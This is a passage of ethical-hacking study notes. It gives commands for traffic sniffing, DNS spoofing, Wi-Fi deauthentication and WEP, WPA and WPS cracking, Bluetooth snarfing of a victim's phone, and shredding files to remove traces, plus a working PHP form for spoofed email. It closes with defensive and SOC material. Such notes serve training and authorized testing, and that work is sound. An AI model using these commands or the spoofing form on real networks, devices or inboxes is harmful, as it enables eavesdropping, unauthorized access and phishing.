driftnet and see the images that the user see on the websites is the
following:

driftnet -i \[Network Interface Name\]

Example:

driftnet -i wlan0

####### Step4: Capturing URLs with URLsnarf

**View the urls the victim is requesting**

urlsnarf -i \<interface\>

![A screenshot of a computer Description automatically generated with
medium confidence](media/image509.png){width="6.5in"
height="0.8479166666666667in"}

**View packets in wireshark or using tcpdump (in hacking machine)**

**Capture all traffic from all ports**

**tcpdump**

**Capture tcp traffic**

tcpdump tcp port 443

*more options...*

tcpdump -i \<interface\> -s \<num_of_packets\> tcp port 443 -w
capture.pcap

*when*

nohup tcpdump -i \<interface\> tcp port 443 -w capture.pcap \> /dev/null
&

**Final Steps:**

-   Disable port-fowarding once done

-   Allow arpspoof commands to gently terminate (ctrl+c) so that arp
    spoofing is stopped and victim machines are left as they were.

###### ARP Spoofing with websploit

<https://null-byte.wonderhowto.com/forum/do-mitm-attack-with-websploit-0180442/>

###### Mitigation \[BLUE TEAM\]

**Detection**

-   Create an arpspoof detector script:
    <https://github.com/bobby-valenzuela/ARPSpoofDetector>

-   Use XARP to detect spoofing attacks: <https://xarp.en.softonic.com/>

-   Use wireshark:
    <https://www.udemy.com/course/learn-ethical-hacking-from-scratch/learn/lecture/5334776#content>

    -   Edit \> Preferences \> protocols \> ARP \> tick "Detect ARP
        request storms"

    -   This checks if any local hosts are trying to send arp requests
        to every known host on a network.

**Prevention**

-   Encrypt your traffic

-   Use a VPN

-   Use a HTTPs everywhere browser extension/plugin

    -   Works only for HTTPs sites -- enforces HTTPs. Doesn't work for
        HTTP-only sites.

#### DNS Spoofing

1.  Start a typical arpspoof attack with better cap

    1.  Bettercap -iface \<interface\> -caplet \<spoof_caplet\>.

2.  Set where users should be redirected

    1.  set dns.spoof.address \<malicious_site\>

3.  Enable for all DNS requests

    1.  set dns.spoof.all true

4.  Specify the domains you want to spoof (comma-separated -- accepts
    globbing)

    1.  set dns.spoof.domains \<example.com, \*.example.com\>

5.  Start the dns spoof

    1.  dns.spoof on

#### Evil twin attack

A method we will cover is called an evil twin. It\'s similar to the
rogue AP example but has a small but important difference. The premise
of an evil twin attack is for you to connect to a network that is
identical to yours. This identical network is our networks evil twin and
is controlled by our attacker. Once we connect to it, they will be able
to monitor our traffic.

#### WAP Honeypot (Rogue access point attack)

A rogue AP is an access point that is installed on the network without
the network administrator\'s knowledge. Sometimes, in corporate
environments, someone may plug a router into their corporate network to
create a simple wireless network. Innocent enough, right? Wrong. This
can actually be pretty dangerous, and could grant unauthorized access to
an authorized secure network. Instead of an attacker having to gain
access to a network by plugging directly into a network port, they can
just stand outside the building and hop onto this wireless network.

<https://www.udemy.com/course/learn-ethical-hacking-from-scratch/learn/lecture/5834138#content>

1.  **Setup WIfi Interface**. Make sure you a wireless adapter that
    accepts AP mode and this can act as your wireless interface
    (iwconfig). This NIC will be your AP and this should be a separate
    NIC from the NIC you are using for internet access.

    a.  Do not use this wireless adapter to connect to a AP -- this NIC
        will itself be an AP.

2.  Download/Run the **WifiHotspot** program.

    a.  <https://github.com/lakinduakash/linux-wifi-hotspot>

3.  Point your capture tool (wireshark or what have you) at the
    interface broadcasting the signal (the one in step 1).

**More on point#1: Adding your external NIC to virtualbox**

1.  Plug in your external NIC and make sure it appears under your list
    of NICs

    1.  ![Graphical user interface, application, Word Description
        automatically
        generated](media/image510.png){width="6.083213035870516in"
        height="3.911843832020997in"}

2.  Add your external NIC to virtualbox-recognized list of adapters

    1.  Go to Control Panel -\> Network & Sharing Center -\> Change
        adapter Settings

    2.  Right click on your network adapter and pick \"properties\"

    3.  In the \"connection uses the following items\" box, at the
        bottom, click the Install button and select \"Service\" from the
        list and click the Add button.

        1.  ![Graphical user interface, application Description
            automatically
            generated](media/image511.png){width="2.8506889763779526in"
            height="2.9952318460192475in"}

        2.  ![Graphical user interface, text, application Description
            automatically
            generated](media/image512.png){width="2.152740594925634in"
            height="1.9641316710411199in"}

    4.  A list of existing services will pop up. you want to choose the
        \"have disk \"option.

        1.  ![Graphical user interface, text, application Description
            automatically
            generated](media/image513.png){width="3.2462609361329835in"
            height="2.370395888013998in"}

    5.  Once you have chosen the Have Disk option you will navigate to
        C:\\Program Files\\Oracle\\VirtualBox\\drivers\\network and pick
        the \"netlwf\" item and add it as a service.

        1.  ![Graphical user interface, text, application Description
            automatically
            generated](media/image514.png){width="4.003299431321085in"
            height="3.0436537620297464in"}

        2.  ![Graphical user interface, text, application, email
            Description automatically
            generated](media/image515.png){width="2.9704997812773404in"
            height="2.1478991688538933in"}

    6.  Close out of Virtual box if you haven\'t already, and re-open
        it. Now the adapter will be in the Network Adapter list for the
        Bridged Adapter field.

        1.  Note the name will show in VirtualBox as the name in grey
            (device description)

            1.  ![Graphical user interface, text, application
                Description automatically
                generated](media/image516.png){width="3.17752624671916in"
                height="0.7605227471566054in"}

            2.  ![Graphical user interface, text, application
                Description automatically
                generated](media/image517.png){width="4.211437007874015in"
                height="1.756152668416448in"}

3.  s

#### Denial-of-service

A Denial-of-Service, or DoS attack, is an attack that tries to prevent
access 

to a service for legitimate users by overwhelming the network or
server. 

-   **The Ping of Death or POD**, is a pretty simple example of an
    (ICMP) DoS attack. It works by sending a malformed ping to a
    computer. The ping would be larger in size than what the internet
    protocol was made to handle. So it results in a buffer overflow.
    This can cause the system to crash and potentially allow the
    execution of malicious code.

-   Another example is a **ping flood**, which sends tons of ping
    packets to a system. More specifically, it sends ICMP echo requests,
    since a ping expects an equal number of ICMP echo replies. If a
    computer can\'t keep up with this, then it\'s prone to being
    overwhelmed and taken down.

-   Similar to a ping flood is a **SYN flood**. Remember that to make a
    TCP connection, a client sends a SYN packet to a server it wants to
    connect to. Next, the server sends back a SYN-ACK message, then the
    client sends in ack message. In a SYN flood, the server is being
    bombarded with the SYN packets. The server is sending back SYN-ACK
    packets but the attacker is not sending ack messages. This means
    that the connection stays open and is taking up the server\'s
    resources. Other users will be unable to connect to the server which
    is a big problem. Since the TCP connection is half-open, we also
    refer to SYN floods as half-open attacks, sounds messy, right? It
    is, the DoS attacks we\'ve learned about so far only use a single
    machine to carry out an attack. But what if attackers could utilize
    multiple machines? A much scarier scenario, they\'d be able to take
    down services in greater volumes and even quicker rates. Even
    scarier, attackers can absolutely do that.

-   **[A DoS attack using multiple systems, is called a distributed
    denial-of-service attack or DDoS]{.underline}**. DDoS attacks need a
    large volume of systems to carry out an attack and they\'re usually
    helped by botnet attackers. In that scenario, they can gain access
    to large volumes of machines to perform an attack. In October of
    2016, a DDoS attack occurred the DNS service provider, Dyn was a
    target of a DDoS. Fake DNS look up requests along with SYN floods
    that botnets to performing overloaded their system. Dyn handled the
    DNS for major website like Reddit, GitHub, Twitter, etc. So once
    that went down, it also took down its customers, making those
    services inaccessible. Don\'t get between people on the Reddit
    threads or Twitter feeds, I know from experience, it\'s not pretty.

![Graphical user interface, text, application Description automatically
generated](media/image518.png){width="5.210600393700787in"
height="2.004076990376203in"}

![Graphical user interface, application, Teams Description automatically
generated](media/image519.png){width="6.5in"
height="4.465972222222222in"}![Graphical user interface, text,
application Description automatically
generated](media/image520.png){width="6.5in"
height="5.490277777777778in"}

#### WAP Password capture and cracking

##### \[STEP1\] WLAN access point scanning (monitor mode enabling)

###### Using ip link

-   Check status

    -   ip a

-   Disable wireless interface

    -   sudo ip link set dev wlp3s0 down

-   Enable monitor mode

    -   sudo iwconfig wlp3s0 mode monitor

-   Verify mode

    -   iwconfig

-   Change back ro managed mode (optional)

    -   sudo iwconfig wlp3s0 mode managed

    -   sudo ip link set dev wlp3s0 up

###### Using ip command

![Text Description automatically
generated](media/image521.png){width="3.1720330271216097in"
height="0.4029440069991251in"}

###### Using iwconfig 

This lists all details about wireless interfaces only

Managed mode means we are only detecting information directed at this
machine -- at the MAC address for our device.

![A page of a book Description automatically generated with medium
confidence](media/image522.png){width="6.5in"
height="6.189583333333333in"}

![Text Description automatically
generated](media/image523.png){width="6.430885826771654in"
height="3.354339457567804in"}

###### Using iwlist 

![Text, letter Description automatically
generated](media/image524.png){width="6.5in" height="3.26875in"}

###### Using airmon-ng 

<https://www.youtube.com/watch?v=wiIoR_0epvs>

Pre-installed in kali.

![Text Description automatically generated with medium
confidence](media/image525.png){width="6.5in"
height="1.9208333333333334in"}

![Text Description automatically
generated](media/image526.png){width="6.5in"
height="4.178472222222222in"}

![Text Description automatically
generated](media/image527.png){width="6.5in"
height="1.4416666666666667in"}

\^ Follow the above first -- i.e. make sure to disable interface and
kill any associated processes.

![Text Description automatically
generated](media/image528.png){width="6.5in"
height="5.408333333333333in"}

##### \[STEP2\] Network Sniffing (Collect Wireless traffic info /cap files -- packet analysis)

###### \[OPTION 1\] airodump (preferred)

![Text Description automatically
generated](media/image529.png){width="6.5in"
height="4.279166666666667in"}

1.  **Enable monitor mode**

    a.  Verify this with iwconfig

> ![Text Description automatically
> generated](media/image530.png){width="6.5in"
> height="1.4270833333333333in"}

b.  **\^** Notice that this shows the Frequency being scanned (2.4 in
    this case\_ which depends on your wireless adapter).

```{=html}
<!-- -->
```
2.  **Run *airodump-ng* on interface in monitor mode**

> ![Text Description automatically
> generated](media/image531.png){width="6.5in"
> height="1.8583333333333334in"}

a.  Understanding output

> ![Calendar Description automatically
> generated](media/image532.png){width="6.5in"
> height="1.6145833333333333in"}

i.  **BSSID**: MAC address of access point

ii. **ESSID**: Name on access point

iii. **PWR**: Signal strength (largest number is best)

```{=html}
<!-- -->
```
3.  Begin scan

![Text, letter Description automatically
generated](media/image533.png){width="6.5in"
height="5.547916666666667in"}

![A page of a book Description automatically generated with medium
confidence](media/image534.png){width="6.177083333333333in"
height="3.1395352143482063in"}

You can do a scan on single specific BSSID (router MAC) as well:

![](media/image535.png){width="6.5in" height="0.24375in"}

Write dump contents to a file like so:

![](media/image536.png){width="6.5in" height="0.22708333333333333in"}

####### airodump - scanning for 5G access points

If you have a 5G capable wireless adaptor but you aren't seeing 5G
connections, enable this by enabling band "a" when running you r scan:

![](media/image537.png){width="4.277997594050744in"
height="0.4027985564304462in"}

\^ Replace "mon0" with the name of your monitor-mode-enabled wireless
interface.

You can also search on multiple bands (channels) -- a bit slower:

![](media/image538.png){width="4.041874453193351in"
height="0.35418525809273843in"}

####### airodump - targeted Sniffing

Sniffing a specific access point

**Format:** airodump-ng --bssid \<bssid\> \--channel \<channel\>
\--write \<file to write results\> \<interface\>

![Text Description automatically generated with medium
confidence](media/image539.png){width="6.5in"
height="2.2006944444444443in"}

###### \[OPTION 2\] tcpdump

![Text Description automatically
generated](media/image540.png){width="6.5in"
height="1.9006944444444445in"}

**Scan any ports**

sudo tcpdump -i eth0 &

**Scan a specific port**

sudo tcpdump -i eth0 port 80

**Scan by port and capture**

sudo tcpdump -i eth0 port 80 -w http.pcap &

**Read a pcap file**

tcpdump -r http.pcap -nv

Note that we don\'t need to use sudo to read packets from a file. Also
note that tcpdump writes full packets to the file, not just the
text-based analysis that it prints to the screen when it\'s operating
normally. For example, somewhere in the output you should see the html
that was returned as the body of the original query in the terminal.

Also tcp replay

![Graphical user interface, text, application Description automatically
generated](media/image541.png){width="6.5in"
height="1.8486111111111112in"}

![Text Description automatically
generated](media/image542.png){width="4.595016404199475in"
height="7.5659317585301835in"}

###### Deauth Attack/ Cracking Access Point

-   Pretend to be client

    -   Change mac address to client

-   As client, request to disconnect from router

-   Pretend to be router

    -   Change mac address to routers

-   As router, validate request for client to disconnect

![Diagram Description automatically
generated](media/image543.png){width="6.5in"
height="3.9319444444444445in"}

![Diagram Description automatically
generated](media/image544.png){width="6.5in"
height="3.5347222222222223in"}

![Text Description automatically
generated](media/image545.png){width="6.5in"
height="3.0972222222222223in"}

-   \--deauth \<number of packtets\>

    -   Send lots so the client stays disconnected until we stop
        deauth-ing ourselves with ctrl+c

-   -a \<access point\>

    -   MAC address of access point (bssid)

-   -c \<client\>

    -   MAC address of client

-   \<interface\>

There's a higher chance of this working while one is also scanning the
network in question with airodump specifying the relevant bssid (multi
tabs work best for this):

![Text Description automatically
generated](media/image546.png){width="6.5in"
height="0.8229166666666666in"}![Text Description automatically
generated](media/image546.png){width="6.5in"
height="0.5930555555555556in"}

aireplay-ng --deauth \<DEAUTH_PKTS\> -a \<WAP_MAC\> -c \<TRGT_MAC\>
\<interface\>

\^ we're setting the number of deauth packets really high just to keep
the client disconnected. You could set it to for a quick
disconnect/reconnect.

Another approach using dictionary:

![A page of a book Description automatically generated with medium
confidence](media/image534.png){width="6.177083333333333in"
height="5.4057655293088365in"}

##### \[STEP3\] Cracking

###### Cracking WEP (aircrack-ng)

Uses RC4 algorithm. WEP sends **IV**s over to access point which are
random bits of chars mixed with the key. If we have enough IVs, we can
figure out the key.

![Text Description automatically
generated](media/image547.png){width="6.5in"
height="3.171527777777778in"}

![A picture containing text Description automatically
generated](media/image548.png){width="6.5in"
height="2.254166666666667in"}

*Preliminary: Run a scan and decide which WAP you want to target (gather
channel and BSSID)*

####### Step 1: Build capture file \[Terminal 1\]

Run airodump on target AP and write to a file:

![Text, calendar Description automatically
generated](media/image549.png){width="6.236431539807524in"
height="2.0487160979877514in"}

*Take note of the 'Data' field, the larger this number is the greater
the chance we have to crack a WEP pw. This adds more information into
our .cap file.*

Allow this to continue running in a terminal session...

####### Step 2: packet injection \[Terminal 2/3\]

Not required per se, but standard for best results.

![Graphical user interface Description automatically
generated](media/image550.png){width="6.5in"
height="2.7756944444444445in"}

This is achieved by packet-injection, we send more packets to the BSSID.

***[Preliminary step (step 1/terminal 1)]{.underline}***: **Track
Data**. Start up an airodump -- save into a file (keep running)

![Text Description automatically
generated](media/image551.png){width="6.0975360892388455in"
height="4.041874453193351in"}

![Calendar Description automatically
generated](media/image552.png){width="6.5in"
height="1.5833333333333333in"}

We're keeping an eye on the '**AUTH**' field as well as this should
change to '**OPEN**' once we associate with that AP.

**Sub steps**

-   **[Step A \[Terminal 2\]]{.underline}:** **Get association
    details.** Grab MAC of your wireless adapter (using 'h' flag)

    -   Ifconfig \> interface in mon mode. Note the 'unspec' property
        and it's first 12 digits. Replace hyphens with colons.

    -   ![Text Description automatically
        generated](media/image553.png){width="6.361438101487314in"
        height="0.9306036745406824in"}

-   **[Step B \[Terminal 3\]]{.underline}** : **Associate with AP.** Run
    aireplay with fakeauth arg, with access point MAC ('-a'), our
    wireless adapter MAC (-h) flag (hardware) and lastly the interface
    in use.

    -   ![](media/image554.png){width="5.8266885389326335in"
        height="0.4305774278215223in"}

    -   --fakeauth arg accepts number of times to run. '0' means
        infinite attempts.

    -   ![Text Description automatically
        generated](media/image555.png){width="6.5in"
        height="1.2472222222222222in"}

    -   *Note: Not uncommon to associate multiple times throughout
        process.*

    -   *Note: The mac of interface in monitor mode can be acquired from
        ifconfig -- replacing the colons with hyphens.*

-   **[Step C \[Terminal 3\]]{.underline}** : **Action a request replay
    attack (packet injection)**. There are other methods, but this is
    most reliable and fruitful.

    -   *The idea here...*

        -   Wait for an SRP packet

        -   Capture it and replay it (causes AP to produce another
            packet)

        -   Repeat until we have enough IVs to crack the key.

    -   Replace 'fakeauth' aith 'arpreplay' -- remove any args fir this
        flag

    -   Replace 'a' flag with 'b' (access point -\> bssid)

    -   Cmd: aireplay-ng --arpreplay -b \<AP_bssid\> -h \<wlan_mac\>
        \<interface\>

    -   Example: aireplay-ng --arpreplay -b 64:16:F0:EC:7B:F3 -h
        48:5D:60:2A:45:25 mon0

    -   ![Text Description automatically
        generated](media/image556.png){width="6.5in"
        height="1.1347222222222222in"}

    -   Once you receive some ARP packets (see pic below) move on to
        next step.

    -   ![Text Description automatically
        generated](media/image557.png){width="6.5in" height="0.9375in"}

####### Step 3: run aircrack-ng on the pcap file \[Terminal 4\]

*Note: you can also re-use the second terminal if you don't want to keep
terminal 2 open with your hardware info of your wireless adapter.*

-   Throughout this process, your first command is still running
    airodump and saving traffic into a .cap file ending with the
    filename "-01.cap". Time to run aircrack on that file.

-   ![](media/image558.png){width="5.646123140857393in"
    height="0.451411854768154in"}

-   This may take multiple attempts.

-   ![A picture containing text Description automatically
    generated](media/image559.png){width="4.828108048993876in"
    height="1.6031791338582677in"}

-   \^ That failed attempt cites "14786" IVs, that number should match
    the 'DATA' field in the airodump running in terminal 1. As long as
    you don't exit with ctrl+c the aircrack should running again when
    more IVs are available. Attempts are actioned every 5000 IVs
    (initialization vectors). Cracking usually occurs between 15k -- 25k
    IVs.

-   Success:

    -   ![Text Description automatically
        generated](media/image560.png){width="5.541912729658793in"
        height="0.9562171916010499in"}

**Plain-text Password**: Next to "KEY FOUND...ASCII" (**As23p** in this
example below)

**NumericalPW (KEY)**: Number after "KEY FOUND" minus delimeter
(**4173323370** in this case)

![Text Description automatically
generated](media/image561.png){width="5.736406386701662in"
height="2.4862390638670164in"}

###### Cracking WPA/WPA2

![Text Description automatically
generated](media/image562.png){width="6.5in"
height="2.651388888888889in"}

####### With WPS enabled

![Text Description automatically
generated](media/image563.png){width="6.5in" height="3.35in"}

######## Step 1: List Aps with WPS enabled

Use **wash** command to list any access points with WPS enabled:

![A picture containing graphical user interface Description
automatically generated](media/image564.png){width="6.5in"
height="1.0493055555555555in"}

\^ Instead of mon0, list whatever interface you have in monitor mode.

######## Step 2: Use reaver to attempt to brute

![Text Description automatically
generated](media/image565.png){width="6.5in" height="1.53125in"}

\^ adding the "no-associate" arg as although reaver can associate on its
own, best results involve associating manually which we are going to do
next.

######## Step 3: Associate with AP using fakeauth

While reaver (above) is running

-   **Associate with AP.** Run aireplay with fakeauth arg, with access
    point MAC ('-a'), our wireless adapter MAC (-h) flag (hardware) and
    lastly the interface in use.

    -   ![](media/image554.png){width="5.8266885389326335in"
        height="0.4305774278215223in"}

    -   --fakeauth arg accepts number of times to run. '0' means
        infinite attempts.

    -   ![Text Description automatically
        generated](media/image555.png){width="6.5in"
        height="1.2472222222222222in"}

    -   *Note: Not uncommon to associate multiple times throughout
        process.*

    -   *Note: The mac of interface in monitor mode can be acquired from
        ifconfig -- replacing the colons with hyphens.*

![A picture containing text Description automatically
generated](media/image566.png){width="6.5in" height="1.63125in"}

####### Without WPS Enabled

WPA/WPA2 fixed all issues with WEP.

Only useful packets for password grabbing are the four "handshake"
packets.

![](media/image567.png){width="6.5in" height="0.6111111111111112in"}

######## Step 1: Build capture file \[Terminal 1\]

Run airodump on target AP and write to a file:

![Text, calendar Description automatically
generated](media/image549.png){width="6.236431539807524in"
height="2.0487160979877514in"}

*Prob change the output filename from "basic_wep" to something like
"wpa_handshake".*

Allow this to continue running in a terminal session...

Next we have to wait for the client to connect/reconnect to the WAP oor
we can perform a deauth attack to speed this up (see next).

######## Step 2: Initiate deauth attack \[Terminal 2\]

aireplay-ng --deauth \<DEAUTH_PKTS\> -a \<WAP_MAC\> -c \<TRGT_MAC\>
\<interface\>

Number of packets should be low -- something like 4 or 5 so the client
quickly disconnects and reconnects.

Keep an eye on the top right side of terminal 1 for a message indicating
the handshake was acquired

![](media/image568.png){width="6.5in" height="2.4631944444444445in"}

After a couple secs...

![](media/image569.png){width="6.5in" height="3.415277777777778in"}

Now we can stop airodump from running on terminal 1.

######## Step 3: Perform wordlist attack

![](media/image570.png){width="6.5in" height="3.7in"}

Each word in wordlist combines with other info (circled) produces a MIC
(message integrity code) and of the MIC matches what we see in the
handshake -- then we know we have a valid password.

**Using aircrack-ng and a wordlist**

*Form*

aircrack-ng \<capture_file\> -w \<wordlist\>

*Example:*

aircrack-ng wpa_handshakes.cap -w wordlist.txt

![](media/image474.png){width="6.5in" height="2.1777777777777776in"}

### Email Spoofing

**Method 1: Setting up SMTP Server**

<https://www.udemy.com/course/learn-ethical-hacking-from-scratch/learn/lecture/11737684#content>

<https://www.udemy.com/course/learn-ethical-hacking-from-scratch/learn/lecture/11737670#content>

**Method 2: Use web hosting**

<https://www.udemy.com/course/learn-ethical-hacking-from-scratch/learn/lecture/19824434#content>

**=== CODE ===**

\<?php

if (isset(\$\_POST\[\"send\"\])) {

\$to = \$\_POST\[\"to\"\];

\$subject = \$\_POST\[\"subject\"\];

\$message = \$\_POST\[\"message\"\];

\$from = \$\_POST\[\"from\"\];

\$name = \$\_POST\[\"name\"\];

if (!(filter_var(\$to, FILTER_VALIDATE_EMAIL) && filter_var(\$from,
FILTER_VALIDATE_EMAIL))) {

echo \"Email address inputs invalid\";

die();

}

\$header = \"From: \" . \$name . \" \<\" . \$from .
\"\>\\r\\nMIME-Version: 1.0\\r\\nContent-type: text/html\\r\\n\";

\$retval = mail (\$to, \$subject, \$message, \$header);

if (\$retval) {

echo \"Email sent.\";

} else {

echo \"Email did not send. Error: \" . \$retval;

}

} else {

echo

\'\<html\>

\<head\>

\<style\>

input\[type=submit\] {

background-color: #4CAF50;

border: none;

color: white;

padding: 14px 32px;

text-decoration: none;

margin: 4px 2px;

cursor: pointer;

font-size: 16px;

}

\</style\>

\</head\>

\<body\>

\<h2\>Spoof Email\</h2\>

\<form action=\"/send.php\" method=\"post\" id=\"emailform\"\>

\<label for=\"to\"\>To:\</label\>\<br\>

\<input type=\"text\" id=\"to\" name=\"to\"\>\<br\>\<br\>

\<label for=\"from\"\>From:\</label\>\<br\>

\<input type=\"text\" id=\"from\" name=\"from\"\>\<br\>\<br\>

\<label for=\"name\"\>Name (optional):\</label\>\<br\>

\<input type=\"text\" id=\"name\" name=\"name\"\>\<br\>\<br\>

\<label for=\"subject\"\>Subject:\</label\>\<br\>

\<input type=\"text\" id=\"subject\" name=\"subject\"\>\<br\>\<br\>

\<label for=\"message\"\>Message \[HTML is supported\]:\</label\>\<br\>

\<textarea rows=\"6\" cols=\"50\" name=\"message\"
form=\"emailform\"\>\</textarea\>\<br\>\<br\>

\<input type=\"hidden\" id=\"send\" name=\"send\" value=\"true\"\>

\<input type=\"submit\" value=\"Submit\"\>

\</form\>

\<p\>An e-mail will be sent to the desired target with a spoofed From
header when you click Submit.\</p\>

\</body\>

\</html\>\' ;

}

?\>

**=== END CODE ===**

### Bluetooth Attacks

#### Bluesnarfing

<https://www.hacktoday.com/kali-linux-tutorial-hack-bluetooth/>

**Installing bluesnarfer**

sudo apt install bluesnarfer

**Configure rfcomm (if needed)**

mkdir -p /dev/bluetooth/rfcomm

mknod -m 666 /dev/bluetooth/rfcomm/0 c 216 0

mknod \--mode=666 /dev/rfcomm0 c 216 0

hciconfig -i hci0 up

hciconfig hci0

**Snarfing**

*Assumes your Bluetooth interface name is hci0*

**hcitool scan hci0**

(Scan for victims)

**hcitool scan hci0**

(ping the victim to see if he is awake)

**l2ping  \< victim mac addr\>**

(browse the victim for rfcomm channels to connect to)

**sdptool browse \--tree \--l2cap \< mac addr \>**

(then you can use bluesnarfer for example to read the victim's
phonebook, dial a number or read Sms or other things.)

**Bluesnarfer -r 1-100 -C 7 -b \< mac addr \>**

(to see available options to do )

**bluebugger -h**

(Dial number )

**bluebugger -m \< victim name \> -c 7 -a \< mac addr \> Dial \< number
\>**

## Removing traces

### Purging files (shred)

![Graphical user interface, text, application Description automatically
generated](media/image571.png){width="5.520833333333333in"
height="8.104166666666666in"}

**Best if keeping file:**

sudo shred --vzfn 10 /dir/file

**Best if removing file:**

sudo shred --vzfun 10 /dir/file

![Text Description automatically
generated](media/image572.png){width="5.9375in"
height="4.197916666666667in"}

![Text Description automatically
generated](media/image573.png){width="6.5in"
height="5.371527777777778in"}

![Text Description automatically
generated](media/image574.png){width="6.5in"
height="2.2666666666666666in"}

# Blue Team: Security in practice

## **Roles in CyberSecurity**

<https://tryhackme.com/room/careersincyber>

A** *Security Operations Center* (SOC)** is a *team* of IT security
professionals tasked with monitoring a company's network and systems 24
hours a day, seven days a week. Their purpose of monitoring is to:

-   **Find vulnerabilities on the network**: A *vulnerability* is a
    weakness that an attacker can exploit to carry out things beyond
    their permission level. A vulnerability might be discovered in any
    device's software (operating system and programs) on the network,
    such as a server or a computer. For instance, the SOC might discover
    a set of MS Windows computers that must be patched against a
    specific published vulnerability. Strictly speaking, vulnerabilities
    are not necessarily the SOC's responsibility; however, unfixed
    vulnerabilities affect the security level of the entire company.

-   **Detect unauthorized activity**: Consider the case where an
    attacker discovered the username and password of one of the
    employees and used it to log in to the company system. It is crucial
    to detect this kind of unauthorized activity quickly before it
    causes any damage. Many clues can help us detect this, such as
    geographic location.

-   **Discover policy violations**: A *security policy* is a set of
    rules and procedures created to help protect a company against
    security threats and ensure compliance. What is considered a
    violation would vary from one company to another; examples include
    downloading pirated media files and sending confidential company
    files insecurely.

-   **Detect intrusions**: *Intrusions* refer to system and network
    intrusions. One example scenario would be an attacker successfully
    exploiting our web application. Another example scenario would be a
    user visiting a malicious site and getting their computer infected.

-   **Support with the incident response**: An *incident* can be an
    observation, a policy violation, an intrusion attempt, or something
    more damaging such as a major breach. Responding correctly to a
    severe incident is not an easy task. The SOC can support the
    incident response team handle the situation.

Security operations cover various tasks to ensure protection; one such
task is threat intelligence.

![Graphical user interface Description automatically
generated](media/image575.png){width="6.5in"
height="3.688888888888889in"}

### Data Sources

The SOC uses many data sources to monitor the network for signs of
intrusions and to detect any malicious behaviour. Some of these sources
are:

-   **Server logs**: There are many types of servers on a network, such
    as a mail server, web server, and domain controller on MS Windows
    networks. Logs contain information about various activities, such as
    successful and failed login attempts, among many others. There is a
    trove of information that can be found in the server logs.

-   **DNS activity**: DNS stands for Domain Name System, and it is the
    protocol responsible for converting a domain name, such
    as tryhackme.com, to an IP address, such as 10.3.13.37, among other
    domain name related queries. One analogy of the DNS query is asking,
    "How can I reach TryHackMe?" and someone replying with the postal
    address. In practice, if someone tries to browse tryhackme.com,
    the DNS server has to resolve it and can log the DNS query to
    monitoring. The SOC can gather information about domain names that
    internal systems are trying to communicate with by merely inspecting
    DNS queries.

-   **Firewall logs**: A firewall is a device that controls network
    packets entering and leaving the network mainly by letting them
    through or blocking them. Consequently, firewall logs can reveal
    much information about what packets passed or tried to pass through
    the firewall.

-   **DHCP logs**: DHCP stands for Dynamic Host Configuration Protocol,
    and it is responsible for assigning an IP address to the systems
    that try to connect to a network. One analogy of the DHCP request
    would be when you enter a fancy restaurant, and the waiter welcomes
    you and guides you to an empty table. Know that DHCP has
    automatically provided your device with the network settings
    whenever you can join a network without manual configuration. By
    inspecting DHCP transactions, we can learn about the devices that
    joined the network.

These are some of the most common data sources; however, many other
sources can be used to aid in the network security monitoring and the
other tasks of the SOC. A SOC might use a Security Information and Event
Management (SIEM) system. The SIEM aggregates the data from the
different sources so that the SOC can efficiently correlate the data and
respond to attacks.

### SOC Services

SOC services include reactive and proactive services in addition to
other services.

Reactive services refer to the tasks initiated after detecting an
intrusion or a malicious event. Example reactive services include:

-   **Monitor security posture**: This is the primary role of the SOC,
    and it includes monitoring the network and computers for security
    alerts and notifications and responding to them as the need
    dictates.

-   **Vulnerability management**: This refers to finding vulnerabilities
    in the company systems and patching (fixing) them. The SOC can
    assist with this task but not necessarily execute it.

-   **Malware analysis**: The SOC might recover malicious programs that
    reached the network. The SOC can do basic analysis by executing it
    in a controlled environment. However, more advanced analysis
    requires sending it to a dedicated team.

-   **Intrusion detection**: An *intrusion detection system* (IDS) is
    used to detect and log intrusions and suspicious packets. The SOC's
    job is to maintain such a system, monitor its alerts, and go through
    its logs as the need dictates.

-   **Reporting**: It is essential to report incidents and alarms.
    Reporting is necessary to ensure a smooth workflow and to support
    compliance requirements.

Proactive services refer to the tasks handled by the SOC without any
indicator of an intrusion. Example proactive services carried out by the
SOC include:

-   **Network security monitoring (NSM)**: This focuses on monitoring
    the network data and analyzing the traffic to detect signs of
    intrusions.

-   **Threat hunting**: With *threat hunting*, the SOC assumes an
    intrusion has already taken place and begins its hunt to see if they
    can confirm this assumption.

-   **Threat Intelligence**: Threat intelligence focuses on learning
    about potential adversaries and their tactics and techniques to
    improve the company's defences. The purpose would be to establish
    a *threat-informed defence*.

Other services by the SOC include **cyber security training**. Many data
breaches and intrusions can be avoided by raising users' security
awareness and arming them with solid security training.

### **Threat Intelligence**

In this context, *intelligence* refers to information you gather about
actual and potential enemies. A *threat* is any action that can disrupt
or adversely affect a system. Threat intelligence aims to gather
information to help the company better prepare against potential
adversaries. The purpose would be to achieve a *threat-informed
defense*. Different companies have different adversaries. Some
adversaries might seek to steal customer data from a mobile operator;
however, other adversaries are interested in halting the production in a
petroleum refinery. Example adversaries include a nation-state cyber
army working for political reasons and a ransomware group acting for
financial purposes. Based on the company (target), we can expect
adversaries.

![Chart Description automatically
generated](media/image576.png){width="6.5in"
height="3.688888888888889in"}

Intelligence needs data. Data has to be collected, processed, and
analyzed. Data collection is done from local sources such as network
logs and public sources such as forums. Processing of data aims to
arrange them into a format suitable for analysis. The analysis phase
seeks to find more information about the attackers and their motives;
moreover, it aims to create a list of recommendations and actionable
steps.

Learning about your adversaries allows you to know their tactics,
techniques, and procedures. As a result of threat intelligence, we
identify the threat actor (adversary), predict their activity, and
consequently, we will be able to mitigate their attacks and prepare a
response strategy.

## Understanding Threats

Preparing for attacks is an important job that the entire security team
is responsible for. Threat actors have many tools they can use depending
on their target. For example, attacking a small business can be
different from attacking a public utility. Each have different assets
and specific defenses to keep them safe. In all cases, anticipating
attacks is the key to preparing for them. In security, we do that by
performing an activity known as threat modeling.

Threat modeling is a process of identifying assets, their
vulnerabilities, and how each is exposed to threats. We apply threat
modeling to everything we protect. Entire systems, applications, or
business processes all get examined from this security-related
perspective.

Creating threat models is a lengthy and detailed activity. They\'re
normally performed by a collection of individuals with years of
experience in the field. Because of that, it\'s considered to be an
advanced skill in security. However, that doesn\'t mean you won\'t be
involved.

There are several threat modeling frameworks used in the field. Some are
better suited for network security. Others are better for things like
information security, or application development.

### Key terms

-   **Threat**: Some potential attack/ Any circumstance or event that
    can negatively impact assets.

-   **Vulnerability**: A susceptibility/ A weakness that can be
    exploited by a threat.

-   **Risk**: Anything that can impact the confidentiality, integrity,
    or availability of an asset.

